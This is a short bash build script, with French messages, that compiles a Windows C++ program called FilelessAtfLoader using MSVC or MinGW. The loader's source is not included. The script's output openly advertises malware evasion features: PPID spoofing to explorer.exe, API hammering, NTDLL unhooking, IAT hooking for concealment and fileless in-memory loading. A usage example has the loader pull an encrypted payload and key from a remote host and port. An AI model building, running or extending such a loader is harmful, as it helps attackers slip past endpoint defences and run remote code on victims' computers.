#!/bin/bash

echo "[+] FilelessAtfLoader - Script de compilation avec améliorations"
echo "[+] Améliorations incluses:"
echo "    ✓ ChaCha20 encryption"
echo "    ✓ PPID Spoofing"
echo "    ✓ API Hammering"
echo ""

# Vérifier si Visual Studio est disponible (pour Windows/WSL)
if command -v cl.exe &> /dev/null; then
    echo "[+] Utilisation de MSVC (Visual Studio)"
    
    # Compiler avec MSVC
    cl.exe /EHsc /O2 \
        FilelessAtfLoader/FilelessAtfLoader.cpp \
        /link kernel32.lib user32.lib advapi32.lib psapi.lib winhttp.lib crypt32.lib ntdll.lib \
        /OUT:FilelessAtfLoader.exe
        
elif command -v x86_64-w64-mingw32-g++ &> /dev/null; then
    echo "[+] Utilisation de MinGW (Cross-compilation)"
    
    # Compiler avec MinGW
    x86_64-w64-mingw32-g++ -O2 -std=c++11 \
        FilelessAtfLoader/FilelessAtfLoader.cpp \
        -o FilelessAtfLoader.exe \
        -lkernel32 -luser32 -ladvapi32 -lpsapi -lwinhttp -lcrypt32 -lntdll \
        -static-libgcc -static-libstdc++
        
else
    echo "[-] Erreur: Aucun compilateur Windows trouvé"
    echo "    Installez Visual Studio ou MinGW-w64"
    exit 1
fi

# Vérifier si la compilation a réussi
if [ -f "FilelessAtfLoader.exe" ]; then
    echo ""
    echo "[+] ✓ Compilation réussie!"
    echo "[+] Exécutable: FilelessAtfLoader.exe"
    echo ""
    echo "[+] Usage:"
    echo "    FilelessAtfLoader.exe <host> <port> <cipher_type> <key_endpoint>"
    echo ""
    echo "    Cipher types supportés:"
    echo "    - AES (original)"
    echo "    - CHACHA20 (nouveau, plus sécurisé)"
    echo ""
    echo "    Exemple:"
    echo "    FilelessAtfLoader.exe 192.168.1.100 8080 CHACHA20 /key"
    echo ""
    echo "[+] Fonctionnalités d'évasion actives:"
    echo "    ✓ PPID Spoofing vers explorer.exe"
    echo "    ✓ API Hammering continu"
    echo "    ✓ Chiffrement ChaCha20 moderne"
    echo "    ✓ Chargement fileless en mémoire"
    echo "    ✓ IAT hooking pour masquage"
    echo "    ✓ NTDLL unhooking"
else
    echo ""
    echo "[-] ❌ Erreur de compilation!"
    echo "    Vérifiez les messages d'erreur ci-dessus"
    exit 1
fi
